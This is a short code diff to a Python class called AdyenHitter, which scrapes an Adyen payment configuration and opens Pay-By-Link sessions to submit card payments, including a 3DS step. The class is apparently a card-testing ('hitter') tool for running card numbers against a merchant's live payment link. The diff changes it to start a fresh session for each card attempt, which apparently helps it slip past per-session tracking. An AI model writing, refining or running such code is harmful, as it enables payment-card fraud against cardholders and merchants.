@@ -494,13 +494,13 @@ class AdyenHitter:
         return cfg
 
     async def _get_config(self, session) -> dict:
-        """Fetch or reuse base Adyen config, refreshing PBL session per card attempt."""
+        """Fetch base config on first call, and bootstrap fresh PBL session for each card attempt."""
         if self._base_cfg is None:
             self._base_cfg = await self._scrape(session)
             return self._base_cfg.copy()
 
         cfg = self._base_cfg.copy()
-        if cfg.get('is_pbl') and cfg.get('linkId') and not cfg.get('sessionData'):
+        if cfg.get('is_pbl') and cfg.get('linkId'):
             lctx = cfg.get('loadingContext') or self._adyen_base(
                 cfg.get('environment', 'live')) + '/'
             pbl = await self._bootstrap_pbl(
@@ -557,11 +557,7 @@ class AdyenHitter:
             "Referer": self.url,
         }
         async with session.post(url, json=body, headers=hdr, timeout=15) as r:
-            res_data = r.json() if callable(r.json) else r.json
-            if isinstance(res_data, dict) and res_data.get('sessionData'):
-                if self._base_cfg is not None:
-                    self._base_cfg['sessionData'] = res_data['sessionData']
-            return res_data
+            return r.json() if callable(r.json) else r.json
 
     # ── submit payment details (3DS completion) ─────────────────────────────
     async def _submit_details(self, session, sid: str, sdata: str,
